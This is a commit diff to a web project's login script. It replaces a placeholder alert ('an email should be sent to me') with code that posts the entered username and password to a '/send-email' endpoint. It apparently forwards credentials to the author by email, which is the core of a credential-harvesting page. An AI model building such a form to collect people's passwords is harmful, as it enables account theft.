dc9cd77e24ed562feb88fba9d140e6bacc07a11e
dblank410-lab <dblank410@gmail.com>
2026-05-09 23:15:51 +0200

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,13 +1,27 @@
-// static/script.js
-
 const form = document.getElementById("loginForm");
 
-form.addEventListener("submit", function(e){
-
+form.addEventListener("submit", async function(e) {
     e.preventDefault();
 
-    alert(
-        "an emial shoulld be sent to me"
-    );
+    const data = {
+        username: form.username.value,
+        password: form.password.value
+    };
 
+    try {
+        const res = await fetch("/send-email", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
+
+        const result = await res.json();
+
+        alert(result.message);
+    } catch (err) {
+        console.error(err);
+        alert("Error sending email");
+    }
 });
